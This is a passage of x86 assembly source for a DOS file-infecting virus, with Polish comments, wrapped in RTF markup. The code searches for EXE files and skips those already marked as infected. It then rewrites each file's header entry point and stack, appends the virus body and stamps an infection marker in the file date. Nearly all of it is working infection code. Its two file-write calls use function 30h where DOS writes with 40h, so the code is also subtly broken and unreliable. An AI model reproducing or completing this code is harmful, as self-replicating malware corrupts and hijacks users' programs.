\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,Atrybut                       ; podaj atrybut poszukiwanej pozycii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,4Eh                           ; funkcja DOS - szukaj pierwszej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    BezInfekcji                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KolejnyPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   [si][NoweDTA.DTADate],VZnacznik  ; czy znaleziony plik jest juz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; zarazony ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    SzukajNastepnyPlik               ; tak = szukaj nastepny}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   word ptr [si][NoweDTA.DTASize],26; czy dlugosc>=26 bajtow ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jb    SzukajNastepnyPlik               ; nie = szukaj nastepny}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,AtrArchive                    ; podaj nowy atrybut : Archive}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA.DTAName]         ; podaj nazwe pliku do zmiany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zmien atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA.DTAName]         ; podaj nazwe pliku do odczytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,3D02h                         ; funkcja DOS - otworz plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; do odczytu i zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xchg  ax,bx                            ; przenies uchwyt pliku do BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,26                            ; ilosc czytanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][Naglowek]                ; podaj dokad czytac 26 bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Fh                           ; funkcja DOS - czytaj z pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][Naglowek]       ; wez dwa pierwsze bajty pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,'mz'                          ; i sprawdz, czy to EXE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    JestEXE                          ; gdy 'MZ', to plik EXE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,'zm'                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   ZamknijPlik                      ; gdy 'ZM', to plik EXE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JestEXE:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   word ptr [si][Naglowek+18h],40h  ; czy plik Nowy EXE ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; (pominiete zostana takze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;  niektore pliki EXE z ustawionym}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;  adresem tablicy relokacji > 40h)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jae   ZamknijPlik                      ; TAK - szukaj nastepny}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][Naglowek+14h]   ; \\  zachowaj stare CS i IP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][StaryIP],ax                 ;  \\ z pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][Naglowek+16h]   ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][StaryCS],ax                 ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][Naglowek+10h]   ; \\  zachowaj stare SS i SP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][StarySP],ax                 ;  \\ z pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][Naglowek+0Eh]   ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][StarySS],ax                 ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][Naglowek+08h]   ; \\  wez dlugosc naglowka w}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,16                            ;  - paragrafach i oblicz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mul   cx                               ; /  jego dlugosc w bajtach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   bp,ax                            ; \\ zachowaj dlugosc na pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   di,dx                            ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][Naglowek+04h]   ; wez ilosc stron}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   word ptr [si][Naglowek+02h],0    ; czy ilosc bajtow na ostatniej stronie=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jz    NieZmniejszaj                    ; TAK - nie zmniejszaj ilosci stron}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,0                             ; czy ilosc stron=0 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jz    NieZmniejszaj                    ; TAK - nie zmniejszaj ilosci stron}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     dec   ax                               ; NIE zmniejsz ilsoc stron o jedna}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieZmniejszaj:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [si][Naglowek+04h],ax   ; zapisz na pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,512                           ; wez dlugosc obrazu programu w stronach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mul   cx                               ; i oblicz jego dlugosc w bajtach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   ax,word ptr [si][Naglowek+02h]   ; dodaj ilosc bajtow na ostatniej stronie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     adc   dx,0                             ; dodaj ewentualne przeniesienie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,word ptr [si][NoweDTA.DTASize]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; \\  czy rozmiar obrazu z naglowka}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   ZamknijPlik                      ;  \\ jest rowny dlugosci pliku ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   dx,word ptr [si][NoweDTA.DTASize+2]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;  / TAK - infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   ZamknijPlik                      ; /  NIE - prawdopodobnie nakladka}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   ax,bp                            ; \\ odejmij od dlugosci pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sbb   dx,di                            ; / dlugosc naglowka}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; ax,dx=dlugosc kodu programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,16                            ; oblicz nowe CS i SP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     div   cx                               ; dla programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [si][Naglowek+14h],dx   ; zachowaj nowe IP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [si][Naglowek+16h],ax   ; zachowaj nowe CS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   dx,100h+VirusDlug                ; stos bedzie za wirusem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     and   dl,11111110b                     ; SP - najczesciej jest parzysty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [si][Naglowek+10h],dx   ; zachowaj nowe SP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [si][Naglowek+0Eh],ax   ; zachowaj nowe SS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][Naglowek+02h]   ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   ax,VirusDlug                     ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cwd                                    ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,512                           ;    \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     div   cx                               ;     \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   word ptr [si][Naglowek+04h],ax   ;      - zmien dlugosc obrazu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr [si][Naglowek+02h],dx   ;     /  w naglowku pliku EXE}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     or    dx,dx                            ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jz    NieDodawaj                       ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     inc   word ptr [si][Naglowek+04h]      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieDodawaj:                                ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ; \\ zeruj CX:DX zawierajace}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ; / adres wzgledem konca pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4202h                         ; funkcja DOS - zmien wskaznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odczytu/zapisu na koniec pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,VirusDlug                     ; ilosc zapisywanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,si                            ; podaj skad zapisac wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ; \\ zeruj CX:DX zawierajace}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ; / adres wzgledem poczatku pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4200h                         ; funkcja DOS - zmien wskaznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odczytu/zapisu na poczatek pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,26                            ; ilosc zapisywanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][Naglowek]                ; podaj skad zapisac nowy naglowek}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,[si][NoweDTA.DTATime]         ; przywroc czas z bufora DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,VZnacznik                     ; zaznacz infekcje pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,5701h                         ; funkcja DOS - wpisz date, czas}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
